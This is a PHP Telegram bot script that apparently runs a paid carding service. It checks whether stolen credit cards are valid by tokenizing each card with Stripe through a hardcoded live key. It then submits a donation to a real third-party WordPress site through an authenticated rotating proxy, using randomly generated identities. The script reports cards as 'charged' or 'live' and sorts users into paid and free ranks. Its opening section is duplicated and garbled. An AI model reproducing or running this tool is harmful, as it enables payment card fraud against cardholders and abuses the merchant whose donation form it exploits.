<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/chk|\.chk|\!chk)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/sau cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Charge 1 USD</code>', $message_id);
            exit();
  }
$r = "0";

$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//



//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>□□□□□ 0%[⬜]</code>
Req: <code>@$username</code>
</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■□□ 50%[🟧]</code>
Req: <code>@$username</code>
</b>");


  //==================[BIN LOOK-UP]======================//

$bin = substr($lista, 0,6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■■□ 80%[🟨]</code>
Req: <code>@$username</code>
</b>");
# -------------------- [1 REQ] -------------------#

$username = "g7305bhx467p4yl";
$password = "ugv0ew3w009j5ii";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=e49ca930-a5fd-418a-9f86-20390ffcfc4677ec3e&sid=9a6f3543-6d8c-4271-93a0-a11c166a6f7d45999f&pasted_fields=number&payment_user_agent=stripe.js%2F25059d5c42%3B+stripe-js-v3%2F25059d5c42%3B+card-element&referrer=https%3A%2F%2Fvoxel.guide&time_on_page=28456&key=pk_live_51NpwDuJJGU2OiPGJMg81F7vHVBhBfXEa9mIYDKKXzcMyrXj5sCu7v2SaHVV1wgAGC3Rqyyy5UFieTsOcngiuzE1H00R0fEcFLm');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$username = "g7305bhx467p4yl";
$password = "ugv0ew3w009j5ii";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://voxel.guide/wp-admin/admin-ajax.php?t=1712821449031');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1712821449031 h2',
'Host: voxel.guide',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://voxel.guide',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://voxel.guide/donate/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1499%26_fluentform_3_fluentformnonce%3D85fff6cf2c%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D5%26payment_method%3Dstripe%26gdpr-agreement%3Don%26ct_bot_detector_event_token%3D045a2c300604193c3e4e3d29769222990551df11918469aabc737cff658bf434%26apbct_visible_fields%3DeyIwIjp7InZpc2libGVfZmllbGRzIjoibmFtZXNbZmlyc3RfbmFtZV0gbmFtZXNbbGFzdF9uYW1lXSBlbWFpbCBjdXN0b20tcGF5bWVudC1hbW91bnQiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6NCwiaW52aXNpYmxlX2ZpZWxkcyI6Il9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQgX2ZsdWVudGZvcm1fM19mbHVlbnRmb3Jtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBwYXltZW50X21ldGhvZCBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjZ9fQ%253D%253D%26__entry_intermediate_hash%3D37d288809f821ea63df6d0b61a32a0bb%26ct_no_cookie_hidden_field%3D_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3RfdXJscyI6IntcInZveGVsLmd1aWRlL2RvbmF0ZS9cIjpbMTcxMjgyMTI2OF19IiwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiJTdCJTIydmlzaWJsZV9maWVsZHMlMjIlM0ElMjJuYW1lcyU1QmZpcnN0X25hbWUlNUQlMjBuYW1lcyU1Qmxhc3RfbmFtZSU1RCUyMGVtYWlsJTIwY3VzdG9tLXBheW1lbnQtYW1vdW50JTIyJTJDJTIydmlzaWJsZV9maWVsZHNfY291bnQlMjIlM0E0JTJDJTIyaW52aXNpYmxlX2ZpZWxkcyUyMiUzQSUyMl9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQlMjBfZmx1ZW50Zm9ybV8zX2ZsdWVudGZvcm1ub25jZSUyMF93cF9odHRwX3JlZmVyZXIlMjBwYXltZW50X21ldGhvZCUyMGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiUyMGFwYmN0X3Zpc2libGVfZmllbGRzJTIwX19lbnRyeV9pbnRlcm1lZGlhdGVfaGFzaCUyMGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQlMjIlMkMlMjJpbnZpc2libGVfZmllbGRzX2NvdW50JTIyJTNBOCU3RCIsImN0X2ZrcF90aW1lc3RhbXAiOiIxNzEyODIxMzUxIiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzOTMlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMTMyMCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM5MyUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E3NDMlN0QiLCJjdF9jaGVja2pzIjoiMjIxOTYxMTI4IiwiY3RfdGltZXpvbmUiOiI3IiwiYXBiY3RfcGl4ZWxfdXJsIjoiaHR0cHMlM0ElMkYlMkZtb2RlcmF0ZTItdjQuY2xlYW50YWxrLm9yZyUyRnBpeGVsJTJGYTZjMjRkMjBlMDRkZThmOWE3ODZmMWI4NzQ0NzgwNzkuZ2lmIiwiY3RfY2hlY2tlZF9lbWFpbHMiOiIlN0IlMjJnbG9vc21va2UlNDBnbWFpbC5jb20lMjIlM0ElN0IlMjJyZXN1bHQlMjIlM0ElMjJDQUNIRUQlMjIlMkMlMjJ0aW1lc3RhbXAlMjIlM0ExNzEyODIxMzY2JTdEJTdEIiwiY3RfcHNfdGltZXN0YW1wIjoiMTcxMjgyMTM1MCIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNzEyODIxMjY4IiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyY2ZhY2E3NjMyNWFhMzQxMDJmZGQ0YzdkM2FmZTY0MjUlMjIlN0QiLCJjdF9wb2ludGVyX2RhdGEiOiIlNUIlNUIzODUlMkMyNTElMkMyNzE4JTVEJTJDJTVCNTg3JTJDMjU5JTJDOTk4NiU1RCUyQyU1QjM4OSUyQzMwNiUyQzEwOTgxJTVEJTJDJTVCMjkzJTJDMTkzJTJDMTIyNDclNUQlMkMlNUIzODglMkMxNjklMkMxMzQxMiU1RCUyQyU1QjQzNCUyQzIyOCUyQzE1MjMzJTVEJTJDJTVCNTQwJTJDMjQ5JTJDMTYxNjElNUQlMkMlNUIyODUlMkM0NiUyQzE3NjUyJTVEJTJDJTVCMzc0JTJDNDklMkMxODgyMyU1RCUyQyU1QjUwMSUyQzIxMCUyQzI5MjczJTVEJTVEIiwiYXBiY3RfaWZyYW1lc19wcm90ZWN0ZWQiOltdLCJhcGJjdF9zZXNzaW9uX2lkIjoicHhmb2x4aCIsImFwYmN0X3NpdGVfcmVmZXJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3ZveGVsLmd1aWRlL2RvbmF0ZS8iLCJ0eXBvIjpbXX0%253D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');

$result2 = curl_exec($ch);

# -------------------- [2 REQ] -------------------#

//==================req 2 end===============//


sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■■■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>");


if (
    strpos($result2, "Thank you for becoming a member") !== false ||
    strpos($result2, 'Membership confirmed.') !== false ||
    strpos($result2, 'Membership Confirmation') !== false ||
    strpos($result2, 'redirectUrl') !== false ||
    strpos($result2, 'incorrect_zip') !== false ||
    strpos($result2, 'Success ') !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, '/donations/thank_you?donation_number=') !== false
) {

$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: CCN CHARGED 1$
•└Response: <code>Thank you for your donation.</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {


$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Insufficient funds</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result2, "incorrect_cvc") !== false) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Incorrect_cvc</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Your card doesn't support this type of purchase</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>3D_Required</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


else {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Dead 🔴
•└Response: <code>Your card was declined.</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}
